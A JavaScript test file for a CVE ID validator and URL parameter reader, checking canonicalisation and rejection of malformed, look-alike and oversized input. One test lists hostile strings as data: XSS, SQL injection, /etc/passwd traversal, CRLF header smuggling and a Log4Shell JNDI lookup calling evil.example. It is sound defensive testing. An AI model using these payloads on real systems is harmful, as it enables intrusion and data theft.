import { test } from 'node:test';
import assert from 'node:assert/strict';
import { parseCveId, readIdParam } from '../lib/validate.js';

test('accepts well-formed CVE IDs and canonicalises case and surrounding whitespace', () => {
  assert.equal(parseCveId('CVE-2021-44228'), 'CVE-2021-44228');
  assert.equal(parseCveId('cve-2021-44228'), 'CVE-2021-44228');
  assert.equal(parseCveId('  CVE-2021-44228\n'), 'CVE-2021-44228');
  assert.equal(parseCveId('CVE-1999-0001'), 'CVE-1999-0001');
  assert.equal(parseCveId('CVE-2024-1234567'), 'CVE-2024-1234567');
});

test('rejects malformed IDs', () => {
  const bad = [
    '', ' ', 'CVE', 'CVE-', 'CVE-2021', 'CVE-2021-', 'CVE-21-44228', 'CVE-2021-123',
    'CVE--2021-44228', 'CVE-2021-44228-1', 'CVE2021-44228', 'CVE-2021-4422a',
    'XCVE-2021-44228', 'CVE-2021-44228X', 'CVE-2021-12345678901',
  ];
  for (const input of bad) assert.equal(parseCveId(input), null, JSON.stringify(input));
});

test('rejects injection, traversal and header-smuggling attempts', () => {
  const hostile = [
    'CVE-2021-44228<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    'CVE-2021-44228; DROP TABLE cves;--',
    "CVE-2021-44228' OR '1'='1",
    'CVE-2021-44228/../../etc/passwd',
    'CVE-2021-44228?cveId=CVE-1999-0001',
    'CVE-2021-44228&apiKey=x',
    'CVE-2021-44228#fragment',
    'CVE-2021-44228%00',
    'CVE-2021-44228\r\nHost: evil.example',
    '\nHost: evil.example\nCVE-2021-44228',
    'https://evil.example/CVE-2021-44228',
    '${jndi:ldap://evil.example/a}',
    '../../CVE-2021-44228',
  ];
  for (const input of hostile) assert.equal(parseCveId(input), null, JSON.stringify(input));
});

test('rejects look-alike Unicode characters', () => {
  assert.equal(parseCveId('CVE-２０２１-44228'), null, 'fullwidth digits');
  assert.equal(parseCveId('CVE-٢٠٢١-44228'), null, 'Arabic-Indic digits');
  assert.equal(parseCveId('CVE‐2021‐44228'), null, 'U+2010 hyphen instead of -');
  assert.equal(parseCveId('СVE-2021-44228'), null, 'Cyrillic С instead of C');
  assert.equal(parseCveId('ＣＶＥ-2021-44228'), null, 'fullwidth letters');
});

test('rejects non-string input without throwing', () => {
  for (const input of [null, undefined, 0, 1234, true, {}, [], ['CVE-2021-44228'], () => 'CVE-2021-44228', Symbol('x')]) {
    assert.equal(parseCveId(input), null);
  }
  assert.equal(parseCveId({ toString: () => 'CVE-2021-44228' }), null);
});

test('rejects very long input quickly (length is checked before the regex)', () => {
  const started = performance.now();
  assert.equal(parseCveId('CVE-2021-'.padEnd(5_000_000, '9')), null);
  assert.equal(parseCveId('A'.repeat(5_000_000)), null);
  assert.ok(performance.now() - started < 200, 'must not scan megabytes of input');
});

test('readIdParam accepts exactly one id parameter', () => {
  const read = (qs) => readIdParam(new URL(`https://example.com/api/cve${qs}`));
  assert.equal(read('?id=CVE-2021-44228'), 'CVE-2021-44228');
  assert.equal(read('?id=cve-2021-44228&other=1'), 'CVE-2021-44228');
  assert.equal(read(''), null);
  assert.equal(read('?id='), null);
  assert.equal(read('?ID=CVE-2021-44228'), null, 'parameter names are case-sensitive');
  assert.equal(read('?id[]=CVE-2021-44228'), null);
  assert.equal(read('?id=CVE-2021-44228&id=CVE-2021-1111'), null, 'duplicate parameters are rejected');
});
